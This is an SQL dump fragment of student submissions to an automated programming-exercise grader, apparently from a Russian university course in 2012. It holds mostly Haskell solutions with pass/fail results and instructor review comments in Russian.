(1050, 34, '3742311', '2012-09-25 18:45:14', 1, '#include "stdafx.h"\r\n#include <iostream>\r\n\r\nusing namespace std;\r\n\r\ntemplate <class Func>\r\ndouble integral(Func f, double a, double b)\r\n{\r\n    int n = 100;\r\n    double dx = (b - a) / n;\r\n\r\n    double result = 0;\r\n\r\n    // метод правых прямоугольников\r\n    for (int i = 0; i < n; i++)\r\n    {\r\n        result += dx * f(a + dx * (i + 1));\r\n	}\r\n\r\n	return result;\r\n}\r\n\r\ndouble square(double x)\r\n{\r\n	return x * x;\r\n}\r\n\r\nint _tmain(int argc, _TCHAR* argv[])\r\n{\r\n	double result = integral(square, 0, 1);\r\n	cout << result;\r\n	return 0;\r\n}', '<br/>Тесты успешно пройдены!'),
(1051, 41, '3742311', '2012-09-25 18:55:24', 0, 'countOdd l = foldr (x y -> y + (mod x 2)) 0 l\r\ncountOdd1 l = sum (map (x -> (mod x 2)) l)', 'Не удалось вычислить выражение "countOdd [2, 3, 4, 8, 5, 33, 9]", проверьте правильность синтаксиса'),
(1052, 41, '3742311', '2012-09-25 18:56:14', 1, 'countOdd l = foldr (x y -> y + (mod x 2)) 0 l\r\ncountOdd1 l = sum (map (x -> (mod x 2)) l)', '<br/>Тесты успешно пройдены!'),
(1053, 42, '3742311', '2012-09-25 19:21:20', 1, 'myfoldl _ s [] = s\r\nmyfoldl f s (h:t) = myfoldl f (f s h) t', '<br/>Тесты успешно пройдены!'),
(1054, 35, '44060', '2012-09-25 19:31:34', 1, 'isosc (x1,y1) (x2,y2) (x3,y3) = (x==y)||(y==z)||(z==x)\r\n		where\r\n			x = t (x1,y1) (x2,y2)\r\n			y = t (x3,y3) (x2,y2)\r\n			z = t (x1,y1) (x3,y3)\r\n			t (x1,y1) (x2,y2) = (x1-x2)*(x1-x2)+(y1-y2)*(y1-y2)', '<br/>Тесты успешно пройдены!'),
(1055, 36, '44060', '2012-09-25 19:40:17', 2, 'cubeTable n | n > 0 = cub n []\r\n	where \r\n		cub 0 rezult = rezult\r\n		cub n rezult = cub (n-1) ((n, n*n*n):rezult)\r\n  --- Нет, это конечно правильно работает, но не по условию((\r\n  --- Эту задачу надо было обязательно сделать используя только стандартные функцми, там в условии написано,\r\n  --- Обратите внимание, пожалуйста.', '<br/>Тесты успешно пройдены!'),
(1056, 39, '17107004', '2012-09-25 20:42:32', 1, '\r\ndata Tree = Node Integer Tree Tree | Empty\r\n\r\n\r\n\r\nminHeight = mh 0 100500\r\n\r\n\r\n\r\nmh n m (Node i Empty Empty) = n\r\n\r\nmh n m (Node i Empty y) = mh n m (Node i y Empty)\r\n\r\nmh n m (Node i x Empty) = if n < m then mh (1 + n) m x else m\r\n\r\nmh n m (Node i x y)  = if n < m then mh (1 + n) (mh (1 + n) m y) x else m\r\n\r\n{-\r\n\r\nmh1 (Node i Empty Empty) = 0\r\n\r\nmh1 (Node i Empty x) = mh1 (Node i x Empty)\r\n\r\nmh1 (Node i x Empty) = 1 + (mh1 x)\r\n\r\nmh1 (Node i x y) = 1 +  min (mh1 x) (mh1 y)\r\n\r\n-}\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(1057, 38, '44060', '2012-09-25 21:07:02', 1, 'data Tree = Node Integer Tree Tree | Empty\r\nheight:: Tree -> Integer\r\nheight Empty = -1\r\nheight (Node n r l) = max (height r) (height l) + 1 ', '<br/>Тесты успешно пройдены!'),
(1058, 39, '44060', '2012-09-25 21:22:14', 2, 'data Tree = Node Integer Tree Tree | Empty\r\nminHeight Empty = 0\r\nminHeight a = ma a 100500\r\n	where\r\n		ma Empty pMin = pMin\r\n		ma (Node n Empty Empty) _ = 0\r\n		ma (Node n r l) pMin = if pMin > 0 \r\n									then min (ma r (pMin-1)) (ma l (pMin-1)) + 1\r\n 									else 0\r\n --- Не совсем так, к сожалению. Вы можете в этом убедиться, если добавите отладочные печати\r\n --- Например так:\r\n ---  import Debug.Trace   -- в начале\r\n --- ...\r\n ---  ma (Node n Empty Empty) _ = trace (show n) 0  -- чтобы видеть, каие листья мы обходим\r\n --- test = minHeight (Node 1 (Node 2 Empty Empty) (Node 3 Empty (Node 4 Empty Empty)))\r\n --- И такой тест. Вы увидите, что печтатются все листья, хотя идея быда сделать, чтобы в лист 4 не заходить.\r\n --- Это потому так получается, что у вас pMin всегда будет примерно 100500. А надо как-то его улучшать - если\r\n --- мы слева что-то нашли, то при обходе правого поддерева это надо учитывать.\r\n --- Попробуйте исправить, пожалуйста.', '<br/>Тесты успешно пройдены!'),
(1059, 30, '3607492', '2012-09-26 08:09:04', 0, 'test :: Integer->Integer->[Integer]->Bool\r\n\r\ntest a b [] = \r\n	if (b>0)\r\n	then if ((a == 0) || (a == b))\r\n		then True\r\n		else False\r\n	else False\r\n		\r\n\r\ntest a b (x:[]) = test a b []\r\n\r\ntest a b (x:y:xs) = \r\n	if (x<y) \r\n	then test a (b+1) (y:xs)\r\n	else\r\n		if (b==0)\r\n		then False\r\n		else \r\n			if (a==0)\r\n			then test b 0 (y:xs)\r\n			else if (a==b)\r\n				 then test a 0 (y:xs)\r\n				 else False\r\n\r\n\r\nparts :: [Integer]->Bool\r\n\r\nparts [] = False\r\nparts (x:[]) = False\r\nparts x = test 0 0 x', 'Выражение имеет неправильное значение: parts [1, 2, 1, 2, 3, 4]'),
(1060, 37, '533223', '2012-09-26 08:46:53', 1, 'minsum (y:ys) = fst(foldl ((res1,res2) x -> if (x+res2<res1) \r\n				then (x+res2, x )\r\n				else (res1, x)\r\n		)\r\n	(1000,1000-y) (y:ys))', '<br/>Тесты успешно пройдены!'),
(1061, 30, '82873297', '2012-09-26 09:06:02', 0, 'parts [] = False\r\n\nparts (x:xs) = parts1 x xs 1\r\n\n\r\n\nparts1 x [] n | (n > 1)   = True\r\n\n              | otherwise = False\r\n\nparts1 x (y:ys) n | (x < y)   = parts1 y ys (n+1)\r\n\n                  | (n > 1)   = parts1 y ys 1\r\n\n                  | otherwise = False\n', 'Выражение имеет неправильное значение: parts [4, 6, 3, 5, 7]'),
(1062, 30, '82873297', '2012-09-26 09:29:51', 1, 'parts [] = False\r\n\r\nparts (x:xs) = parts1 x xs [1]\r\n\r\n\r\n\r\nparts1 _ [] (z:zs) | (z > 1) = (gcdlist z zs) > 1\r\n\r\n                   | otherwise = False \r\n\r\nparts1 x (y:ys) (z:zs) | (x < y) = parts1 y ys ((z+1):zs)\r\n\r\n                       | (z > 1) = parts1 y ys (1:z:zs)\r\n\r\n                       | otherwise = False\r\n\r\n\r\n\r\ngcdlist n [] = n\r\n\r\ngcdlist n (x:xs) = gcdlist (gcd n x) xs\r\n', '<br/>Тесты успешно пройдены!'),
(1063, 31, '82873297', '2012-09-26 09:33:29', 0, 'parts2 [] = False\r\n\nparts2 xs | (mod (length xs) 2 == 1) = False\r\n\nparts2 xs = parts21 xs (-1/0) (div (length xs) 2) (-1/0)\r\n\n\r\n\nparts21 (x:xs) _ 0 my = (x > my) && (isIncr x xs)\r\n\nparts21 (x:xs) mx n my | (length xs == n-1)   = (x > mx) && (isIncr x xs)\r\n\n                       | (x > mx) && (x > my) = (parts21 xs x (n-1) my) || (parts21 xs mx n x)\r\n\n                       | (x > mx)             = parts21 xs x (n-1) my\r\n\n                       | (x > my)             = parts21 xs mx n x\r\n\n                       | otherwise            = False\r\n\n\r\n\nisIncr x [] = True\r\n\nisIncr x (y:ys) | (x < y)   = isIncr y ys\r\n\n                | otherwise = False\n', '<br/>Тесты успешно пройдены!'),
(1064, 31, '82873297', '2012-09-26 09:34:02', 1, 'parts2 [] = False\r\n\r\nparts2 xs | (mod (length xs) 2 == 1) = False\r\n\r\nparts2 xs = parts21 xs (-1/0) (div (length xs) 2) (-1/0)\r\n\r\n\r\n\r\nparts21 (x:xs) _ 0 my = (x > my) && (isIncr x xs)\r\n\r\nparts21 (x:xs) mx n my | (length xs == n-1)   = (x > mx) && (isIncr x xs)\r\n\r\n                       | (x > mx) && (x > my) = (parts21 xs x (n-1) my) || (parts21 xs mx n x)\r\n\r\n                       | (x > mx)             = parts21 xs x (n-1) my\r\n\r\n                       | (x > my)             = parts21 xs mx n x\r\n\r\n                       | otherwise            = False\r\n\r\n\r\n\r\nisIncr x [] = True\r\n\r\nisIncr x (y:ys) | (x < y)   = isIncr y ys\r\n\r\n                | otherwise = False\r\n', '<br/>Тесты успешно пройдены!'),
(1065, 30, '3607492', '2012-09-26 09:46:34', 1, '  --- ОК, но можно на самом деле, найти ответ более жффективнно, за один просмотр списка, \r\n  --- это мы немного обсудим в следующий раз\r\ntest :: Int->[Int]->Bool\r\n\r\ntest 0 _ = False\r\ntest 1 _ = False\r\ntest a x =\r\n	if (length(x) `mod` a==0)\r\n	then \r\n		if (check a a x)\r\n		then True\r\n		else \r\n			if (a==length(x))\r\n				then test (round(sqrt(fromIntegral a))+1) x\r\n				else test (a-1) x\r\n	else\r\n		test (a-1) x\r\n\r\ncheck :: Int -> Int ->[Int]->Bool\r\n\r\ncheck a 0 [] = True\r\ncheck a _ [] = False\r\ncheck a b (x:[]) = check a (b-1) []\r\ncheck a b (x:y:xs) =\r\n	if (b==0)\r\n	then check a a (x:y:xs)\r\n	else\r\n		if (b==1)\r\n		then check a a (y:xs)\r\n		else \r\n			if (x<y)\r\n			then check a (b-1) (y:xs)\r\n			else False \r\n\r\n\r\n\r\nparts :: [Int]->Bool\r\nparts x = test (length(x)) x', '<br/>Тесты успешно пройдены!'),
(1066, 42, '3607492', '2012-09-26 09:57:31', 1, 'myfoldl :: (a->a->a)->a->[a]->a\r\n  --- На самом дле тип неправильный, тип списка может отличаться от типа результата.\r\n  --- По еще лучше вообще тип не писать)\r\n\r\nmyfoldl _ x [] = x\r\nmyfoldl f x (y:ys) = myfoldl f (f x y) ys', '<br/>Тесты успешно пройдены!'),
(1067, 41, '3607492', '2012-09-26 10:15:06', 0, 'countOdd :: [Int]->Int\r\n\r\ncountOdd [] = 0\r\ncountOdd z = foldl (x y -> \r\n							if (y `mod` 2 == 1)\r\n							then x+1\r\n							else x) 0 z\r\n\r\ncountOdd1 :: [Int]->Int\r\ncountOdd1 z = foldl (+) 0 (map (`mod` 2) z)', '<br/>Тесты успешно пройдены!'),
(1068, 41, '3607492', '2012-09-26 10:35:32', 1, 'countOdd :: [Int]->Int\r\n\r\ncountOdd [] = 0\r\ncountOdd z = foldl (x y -> \r\n							if (y `mod` 2 == 1)\r\n							then x+1\r\n							else x) 0 z\r\n\r\ncountOdd1 :: [Int]->Int\r\ncountOdd1 z = length (filter (x -> (x `mod` 2)==1) z)', '<br/>Тесты успешно пройдены!'),
(1069, 39, '374969', '2012-09-26 11:16:56', 2, 'data Tree = Node Int Tree Tree | Empty\r\n\r\nminHeight (Node _ Empty Empty) = 0\r\nminHeight (Node _ Empty tree2) = 1 + minHeight tree2\r\nminHeight (Node _ tree1 Empty) = 1 + minHeight tree1\r\nminHeight (Node _ tree1 tree2) = 1 + min (minHeight tree1) (minHeight tree2)\r\n  --- Но тут же нет никакой оптимизации..\r\n  --- В этой задаче набо обязательно сделать так, чтобы обходились не все листья', '<br/>Тесты успешно пройдены!'),
(1070, 35, '374969', '2012-09-26 11:24:07', 0, '-- Проверка теста: должен быть тест проверяющий случаи вырожденных треугольников\r\nsqrLength (x1,y1) (x2,y2) = (x1-x2)^2 + (y1-y2)^2\r\nisosс (x1,y1) (x2,y2) (x3,y3) = (p1==p2)||(p1==p3)||(p2==p3)\r\n                                where p3 = sqrLength (x1,y1) (x2,y2)\r\n                                      p2 = sqrLength (x1,y1) (x3,y3)\r\n                                      p1 = sqrLength (x2,y2) (x3,y3)', 'Не удалось вычислить выражение "isosc (0, 2) (2, 0) (2,2)", проверьте правильность синтаксиса'),
(1071, 35, '374969', '2012-09-26 11:35:31', 0, 'sqrLength (x1,y1) (x2,y2) = (x1-x2)^2 + (y1-y2)^2\r\nisosс (x1,y1) (x2,y2) (x3,y3) = (p1==p2)||(p1==p3)||(p2==p3)\r\n                                    where p3 = sqrLength (x1,y1) (x2,y2)\r\n                                          p2 = sqrLength (x1,y1) (x3,y3)\r\n                                          p1 = sqrLength (x2,y2) (x3,y3)', 'Не удалось вычислить выражение "isosc (0, 2) (2, 0) (2,2)", проверьте правильность синтаксиса'),
(1072, 35, '374969', '2012-09-26 11:41:15', 0, 'sqrLength (x1,y1) (x2,y2) = (x1-x2)^2 + (y1-y2)^2\r\nisosс (x1,y1) (x2,y2) (x3,y3) = (p1==p2)||(p1==p3)||(p2==p3)\r\n                                    where p3 = sqrLength (x1,y1) (x2,y2)\r\n                                          p2 = sqrLength (x1,y1) (x3,y3)\r\n                                          p1 = sqrLength (x2,y2) (x3,y3)', 'Не удалось вычислить выражение "isosc (0, 2) (2, 0) (2,2)", проверьте правильность синтаксиса'),
(1073, 37, '3607492', '2012-09-26 11:49:55', 1, 'minsum :: [Int]->Int\r\n\r\nminsum [] = 0\r\nminsum (x:[]) = 0\r\nminsum (x:xs) = minimum (zipWith (+) (x:xs) xs)', '<br/>Тесты успешно пройдены!'),
(1074, 35, '374969', '2012-09-26 11:53:04', 0, 'sqrLength (x1,y1) (x2,y2) = (x1-x2)^2 + (y1-y2)^2\r\nisosс (x1,y1) (x2,y2) (x3,y3) = (p1==p2)||(p1==p3)||(p2==p3)\r\n                                    where p3 = sqrLength (x1,y1) (x2,y2)\r\n                                          p2 = sqrLength (x1,y1) (x3,y3)\r\n                                          p1 = sqrLength (x2,y2) (x3,y3)', 'Не удалось вычислить выражение "isosc (0, 2) (2, 0) (2,2)", проверьте правильность синтаксиса'),
(1075, 36, '3607492', '2012-09-26 12:01:27', 1, 'cubeTable :: Int -> [(Int,Int)]\r\n\r\ncubeTable 0 = []\r\n  --- Это правило не нужно, без него все будет работать точно также\r\ncubeTable z = [ (x,x*x*x)|x<-[1..z] ]', '<br/>Тесты успешно пройдены!'),
(1076, 35, '374969', '2012-09-26 12:21:15', 0, 'sqrLength (x1,y1) (x2,y2) = (x1-x2)^2 + (y1-y2)^2\r\nisosc (x1,y1) (x2,y2) (x3,y3) = (p1==p2)||(p1==p3)||(p2==p3)\r\n                                    where p3 = sqrLength (x1,y1) (x2,y2)\r\n                                          p2 = sqrLength (x1,y1) (x3,y3)\r\n                                          p1 = sqrLength (x2,y2) (x3,y3)', '<br/>Тесты успешно пройдены!'),
(1077, 35, '374969', '2012-09-26 12:22:00', 1, '-- Проверка теста: должен быть тест проверяющий случаи вырожденных треугольников\r\n   --- Я сосзнательно такие тесты не описывал. потому что мне лично не совсем очевидно,\r\n   --- например, (0,0) (0,1) (0,2) - это равнобедренный треугольник, или вообще не треугольник?\r\n   --- Википедия считает, что не треугольник\r\nsqrLength (x1,y1) (x2,y2) = (x1-x2)^2 + (y1-y2)^2\r\nisosc (x1,y1) (x2,y2) (x3,y3) = (p1==p2)||(p1==p3)||(p2==p3)\r\n    --- Тут лучше написать\r\n    --- isosc pt1 pt2 pt3 = (p1==p2)||(p1==p3)||(p2==p3)\r\n    ---            where p3 = sqrLength pt1 pt2 и т.д.\r\n                                          p2 = sqrLength (x1,y1) (x3,y3)\r\n                                          p1 = sqrLength (x2,y2) (x3,y3)', '<br/>Тесты успешно пройдены!'),
(1078, 43, '3607492', '2012-09-26 12:51:21', 0, 'check :: Int->Int->Int->Int->Int->Int->(Int,Int)\r\ncheck a 0 x1 y1 x2 y2 = if (a==1) \r\n						  then (y2,x2)\r\n						  else (0,0)\r\ncheck a b x1 y1 x2 y2 = check b (a - b * (div a b)) (x2 - x1 * (div a b)) (y2 - y1 * (div a b)) x1 y1\r\n\r\neuclid :: Int->Int->(Int,Int)\r\n\r\neuclid 0 _ = (0,0)\r\neuclid _ 0 = (0,0)\r\neuclid a b = if (a>b)\r\n			 then check a b 0 1 1 0\r\n			 else check b a 0 1 1 0', 'Выражение имеет неправильное значение: let (x,y) = euclid 1 0 in 1*x+0*y'),
(1079, 37, '3431532', '2012-09-26 12:51:21', 1, 'minsum (x:xs) =  minimum (zipWith (+) (x:xs) xs)', '<br/>Тесты успешно пройдены!'),
(1080, 43, '3607492', '2012-09-26 12:52:44', 0, 'check :: Int->Int->Int->Int->Int->Int->(Int,Int)\r\ncheck a 0 x1 y1 x2 y2 = if (a==1) \r\n						  then (y2,x2)\r\n						  else (0,0)\r\ncheck a b x1 y1 x2 y2 = check b (a - b * (div a b)) (x2 - x1 * (div a b)) (y2 - y1 * (div a b)) x1 y1\r\n\r\neuclid :: Int->Int->(Int,Int)\r\n\r\neuclid 0 1 = (0,1)\r\neuclid 1 0 = (1,0)\r\neuclid 0 _ = (0,0)\r\neuclid _ 0 = (0,0)\r\neuclid a b = if (a>b)\r\n			 then check a b 0 1 1 0\r\n			 else check b a 0 1 1 0', 'Выражение имеет неправильное значение: let (x,y) = euclid 33 25 in 33*x+25*y'),
(1081, 43, '3607492', '2012-09-26 12:59:27', 1, 'check :: Int->Int->Int->Int->Int->Int->(Int,Int)\r\ncheck a 0 x1 y1 x2 y2 = if (a==1) \r\n						  then (x2,y2)\r\n						  else (0,0)\r\ncheck a b x1 y1 x2 y2 = check b (a - b * (div a b)) (x2 - x1 * (div a b)) (y2 - y1 * (div a b)) x1 y1\r\n\r\neuclid :: Int->Int->(Int,Int)\r\n\r\neuclid 0 1 = (0,1)\r\neuclid 1 0 = (1,0)\r\neuclid 0 _ = (0,0)\r\neuclid _ 0 = (0,0)\r\neuclid a b = if (a>b)\r\n			 then check a b 0 1 1 0\r\n			 else (snd (check b a 0 1 1 0), fst (check b a 0 1 1 0))', '<br/>Тесты успешно пройдены!'),
(1082, 43, '3431532', '2012-09-26 13:38:24', 0, 'euclid a b = find a b 1 0 0 1\r\n\r\nfind a b x1 x2 y1 y2 | a `mod` b == 0 = (x2, y2)\r\nfind a b x1 x2 y1 y2 = find b (a `mod` b) x2 (x1 - x2*(a `div` b)) y2 (y1 - y2*(a `div` b))\r\n', 'Не удалось вычислить выражение "let (x,y) = euclid 1 0 in 1*x+0*y", проверьте правильность синтаксиса'),
(1083, 43, '3431532', '2012-09-26 13:41:59', 0, '\r\neuclid a b = find a b 1 0 0 1\r\n\r\nfind a b x1 x2 y1 y2 | b == 0 || a `mod` b == 0 = (x2, y2)\r\nfind a b x1 x2 y1 y2 = find b (a `mod` b) x2 (x1 - x2*(a `div` b)) y2 (y1 - y2*(a `div` b))\r\n', 'Выражение имеет неправильное значение: let (x,y) = euclid 1 0 in 1*x+0*y'),
(1084, 43, '3431532', '2012-09-26 13:44:58', 1, 'euclid x 0 = (1,0)\r\neuclid a b = find a b 1 0 0 1\r\n\r\nfind a b x1 x2 y1 y2 | b == 0 || a `mod` b == 0 = (x2, y2)\r\nfind a b x1 x2 y1 y2 = find b (a `mod` b) x2 (x1 - x2*(a `div` b)) y2 (y1 - y2*(a `div` b))\r\n', '<br/>Тесты успешно пройдены!'),
(1085, 40, '3607492', '2012-09-26 14:05:16', 0, 'list :: Int -> [Int] ->[[Int]]\r\nlist _ [] = []\r\nlist x z = (take x z) : (list x (drop x z))\r\n\r\n\r\nframe::Int->[[Int]]\r\n\r\nframe 0 = []\r\nframe z = list z (map ((x,y) -> if (mod x (z-1)==1 || mod y (z-1)==1) then 1 else 0) ([(x,y)|x<-[1..z],y<-[1..z]]))\r\n', 'Выражение имеет неправильное значение: frame 2'),
(1086, 30, '3431532', '2012-09-26 14:06:49', 0, 'parts x = find x 2\r\n\r\nfind x y | check x y == True = True\r\nfind x y | (length x) > y = False\r\nfind x y | check x y /= True = find x (y+1)\r\n\r\ncheck [] y = True\r\ncheck x y = checkOrder (take y x) && check (drop y x) y\r\n\r\n\r\ncheckOrder [] = True\r\ncheckOrder [x] = True\r\ncheckOrder (x:y:xs) = x<y && checkOrder (y:xs)', 'Выражение имеет неправильное значение: parts [1, 2, 8, 2, 5, 6]'),
(1087, 40, '3607492', '2012-09-26 14:09:18', 1, 'list :: Int -> [Int] ->[[Int]]\r\nlist _ [] = []\r\nlist x z = (take x z) : (list x (drop x z))\r\n\r\n\r\nframe::Int->[[Int]]\r\n\r\nframe 0 = []\r\nframe z = list z (map ((x,y) -> if (mod x z<=1 || mod y z<=1) then 1 else 0) ([(x,y)|x<-[1..z],y<-[1..z]]))\r\n   --- На самом деле вашу прекрасную идею можно записать прозе с помощью вложенных конструкций list comprehension\r\n   --- frame z = [[if mod x z<=1 || mod y z<=1 then 1 else 0 | x<-[1..z]] | y<-[1..z]]', '<br/>Тесты успешно пройдены!'),
(1088, 30, '3431532', '2012-09-26 14:11:41', 0, 'parts x = find x 2\r\n\r\nfind x y | (length x) < y = False\r\nfind x y | check x y == True = True\r\nfind x y = find x (y+1)\r\n\r\ncheck [] y = True\r\ncheck x y = checkOrder (take y x) && check (drop y x) y\r\n\r\n\r\ncheckOrder [] = True\r\ncheckOrder [x] = True\r\ncheckOrder (x:y:xs) = x<y && checkOrder (y:xs)\r\n', 'Выражение имеет неправильное значение: parts [4, 6, 3, 5, 7]'),
(1089, 30, '3431532', '2012-09-26 14:15:12', 0, 'parts x = find x 2\r\n\r\nfind x y | (length x) < y = False\r\nfind x y | check x y == True = True\r\nfind x y = find x (y+1)\r\n\r\ncheck [] y = True\r\ncheck x y = checkOrder (take y x) && check (drop y x) y\r\n\r\n\r\ncheckOrder [] = True\r\ncheckOrder [x] = True\r\ncheckOrder (x:y:xs) = x<y && checkOrder (y:xs)\r\n', 'Выражение имеет неправильное значение: parts [4, 6, 3, 5, 7]'),
(1090, 30, '3431532', '2012-09-26 14:15:15', 1, '   --- ОК, но на самом деле можно проще, за один проход по списку, это мы немного обсудим.\r\nparts x = find x 2\r\n\r\nfind x y | (length x) < y = False\r\nfind x y | (length x) `mod` y /= 0 = find x (y+1)\r\nfind x y | check x y == True = True\r\nfind x y  = find x (y+1)\r\n\r\ncheck [] y = True\r\ncheck x y = checkOrder (take y x) && check (drop y x) y\r\n\r\n\r\ncheckOrder [] = True\r\ncheckOrder [x] = True\r\ncheckOrder (x:y:xs) = x<y && checkOrder (y:xs)', '<br/>Тесты успешно пройдены!'),
(1091, 39, '374969', '2012-09-26 15:34:05', 0, 'data Tree = Node Int Tree Tree | Empty\r\n\r\nisList (Node _ Empty Empty) = True\r\nisList _                    = False\r\n\r\ngetSubTree (Node _ Empty tree2) = [tree2]\r\ngetSubTree (Node _ tree1 Empty) = [tree1]\r\ngetSubTree (Node _ tree1 tree2) = [tree1, tree2]\r\n\r\nminHeightH deep lstTree = if(any isList lstTree) then deep else minHeightH (deep+1) [x| cur <- lstTree, x <- getSubTree cur]', 'Не удалось вычислить выражение "minHeight (Node 1 Empty Empty)", проверьте правильность синтаксиса'),
(1092, 39, '374969', '2012-09-26 15:35:19', 1, 'data Tree = Node Int Tree Tree | Empty\r\n\r\nisList (Node _ Empty Empty) = True\r\nisList _                    = False\r\n   --- Просто как замечание, лучше, видимо, назвать isLeaf, слово List тут будет путать  ) \r\n\r\ngetSubTree (Node _ Empty tree2) = [tree2]\r\ngetSubTree (Node _ tree1 Empty) = [tree1]\r\ngetSubTree (Node _ tree1 tree2) = [tree1, tree2]\r\n\r\nminHeightH deep lstTree = if(any isList lstTree) then deep else minHeightH (deep+1) [x| cur <- lstTree, x <- getSubTree cur]\r\n\r\nminHeight tree = minHeightH 0 [tree]', '<br/>Тесты успешно пройдены!'),
(1093, 35, '3607492', '2012-09-26 16:24:41', 1, 'check [x,y,z] = if (x==y || x==z || y==z) then True else False\r\n  --- или просто check [x,y,z] = x==y || ...\r\n\r\n\r\nisosc::(Int,Int)->(Int,Int)->(Int,Int)->Bool\r\n\r\nisosc x y z = if (x==y || x==z || y==z) then False else check (zipWith ((x,y) (x1,y1) -> (x-x1)*(x-x1) +(y-y1)*(y-y1)) [x,y,z] [y,z,x])', '<br/>Тесты успешно пройдены!'),
(1094, 45, 'Deutsche', '2012-09-26 18:39:43', 1, '﻿// Задача 8.1 Проверка, для двумерного массива массивов, что в каждом из них есть хотя бы один чётный элемент. Чистяков П.П. 543 гр.\r\n\r\n\r\n\r\nusing System;\r\n\r\nusing System.Collections.Generic;\r\n\r\nusing System.Linq;\r\n\r\nusing System.Text;\r\n\r\n\r\n\r\nnamespace _8._1\r\n\r\n{\r\n\r\n    class Program\r\n\r\n    {\r\n\r\n        static void Main(string[] args)\r\n\r\n        {\r\n\r\n            Console.WriteLine("Тест №1");\r\n\r\n            Console.WriteLine("Следующий массив массивов:");\r\n\r\n            int[][] a1 = new int[3][]\r\n\r\n            {\r\n\r\n                new int[] {0, 2, 4, 6, 7, -11},\r\n\r\n                new int[] {115, 222, 113, -123},\r\n\r\n                new int[] {-21, 5, 51, -77, 95, 1, 115}\r\n\r\n            };\r\n\r\n            for (int i = 0; i < a1[0].Length; i++)\r\n\r\n                Console.Write(a1[0][i]+" ");\r\n\r\n            Console.WriteLine("");\r\n\r\n            for (int i = 0; i < a1[1].Length; i++)\r\n\r\n                Console.Write(a1[1][i] + " ");\r\n\r\n            Console.WriteLine("");\r\n\r\n            for (int i = 0; i < a1[2].Length; i++)\r\n\r\n                Console.Write(a1[2][i] + " ");\r\n\r\n            Console.WriteLine("");\r\n\r\n\r\n\r\n            bool b1 = a1.All(x => x.Any(y => y % 2 == 0));\r\n\r\n            Console.Write("Верно ли, что в каждом из массивов есть хотя бы один чётный элемент: ");\r\n\r\n            Console.WriteLine(b1);\r\n\r\n\r\n\r\n            Console.WriteLine("");\r\n\r\n            Console.WriteLine("Тест №2");\r\n\r\n            Console.WriteLine("Следующий массив массивов:");\r\n\r\n            int[][] a2 = new int[3][]\r\n\r\n            {\r\n\r\n                new int[] {0, 2, 4, 6, 7, -11},\r\n\r\n                new int[] {115, 222, 113, -123},\r\n\r\n                new int[] {-21, 5, 51, -76, 95, 1, 115}\r\n\r\n            };\r\n\r\n            for (int i = 0; i < a2[0].Length; i++)\r\n\r\n                Console.Write(a2[0][i] + " ");\r\n\r\n            Console.WriteLine("");\r\n\r\n            for (int i = 0; i < a2[1].Length; i++)\r\n\r\n                Console.Write(a2[1][i] + " ");\r\n\r\n            Console.WriteLine("");\r\n\r\n            for (int i = 0; i < a2[2].Length; i++)\r\n\r\n                Console.Write(a2[2][i] + " ");\r\n\r\n            Console.WriteLine("");\r\n\r\n\r\n\r\n            bool b2 = a2.All(x => x.Any(y => y % 2 == 0));\r\n\r\n            Console.Write("Верно ли, что в каждом из массивов есть хотя бы один чётный элемент: ");\r\n\r\n            Console.WriteLine(b2);\r\n\r\n\r\n\r\n            Console.WriteLine("");\r\n\r\n            Console.WriteLine("Тест №3");\r\n\r\n            Console.WriteLine("Следующий массив массивов:");\r\n\r\n            int[][] a3 = new int[5][]\r\n\r\n            {\r\n\r\n                new int[] {1, -12, 7, 23, -124},\r\n\r\n                new int[] {40, 13, -1245, 1235, 23, 236},\r\n\r\n                new int[] {3485, -345, 68},\r\n\r\n                new int[] {-12, 0, 3485},\r\n\r\n                new int[] {383, 42, -235, -1, 2523}\r\n\r\n            };\r\n\r\n            for (int i = 0; i < a3[0].Length; i++)\r\n\r\n                Console.Write(a3[0][i] + " ");\r\n\r\n            Console.WriteLine("");\r\n\r\n            for (int i = 0; i < a3[1].Length; i++)\r\n\r\n                Console.Write(a3[1][i] + " ");\r\n\r\n            Console.WriteLine("");\r\n\r\n            for (int i = 0; i < a3[2].Length; i++)\r\n\r\n                Console.Write(a3[2][i] + " ");\r\n\r\n            Console.WriteLine("");\r\n\r\n            for (int i = 0; i < a3[3].Length; i++)\r\n\r\n                Console.Write(a3[3][i] + " ");\r\n\r\n            Console.WriteLine("");\r\n\r\n            for (int i = 0; i < a3[4].Length; i++)\r\n\r\n                Console.Write(a3[4][i] + " ");\r\n\r\n            Console.WriteLine("");\r\n\r\n\r\n\r\n            bool b3 = a3.All(x => x.Any(y => y % 2 == 0));\r\n\r\n            Console.Write("Верно ли, что в каждом из массивов есть хотя бы один чётный элемент: ");\r\n\r\n            Console.WriteLine(b3);\r\n\r\n\r\n\r\n            Console.WriteLine("");\r\n\r\n            Console.WriteLine("Тест №4");\r\n\r\n            Console.WriteLine("Следующий массив массивов:");\r\n\r\n            int[][] a4 = new int[4][]\r\n\r\n            {\r\n\r\n                new int[] {7, 3, -15, -23426, 3737},\r\n\r\n                new int[] {3461, 3465, 34265, -3467, -2349},\r\n\r\n                new int[] {-347, 3451, 2034},\r\n\r\n                new int[] {345, -348, 2337, 235, 235, 9585, -843}\r\n\r\n            };\r\n\r\n            for (int i = 0; i < a4[0].Length; i++)\r\n\r\n                Console.Write(a4[0][i] + " ");\r\n\r\n            Console.WriteLine("");\r\n\r\n            for (int i = 0; i < a4[1].Length; i++)\r\n\r\n                Console.Write(a4[1][i] + " ");\r\n\r\n            Console.WriteLine("");\r\n\r\n            for (int i = 0; i < a4[2].Length; i++)\r\n\r\n                Console.Write(a4[2][i] + " ");\r\n\r\n            Console.WriteLine("");\r\n\r\n            for (int i = 0; i < a4[3].Length; i++)\r\n\r\n                Console.Write(a4[3][i] + " ");\r\n\r\n            Console.WriteLine("");\r\n\r\n\r\n\r\n            bool b4 = a4.All(x => x.Any(y => y % 2 == 0));\r\n\r\n            Console.Write("Верно ли, что в каждом из массивов есть хотя бы один чётный элемент: ");\r\n\r\n            Console.WriteLine(b4);\r\n\r\n\r\n\r\n            Console.ReadLine();\r\n\r\n        }\r\n\r\n    }\r\n\r\n}\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
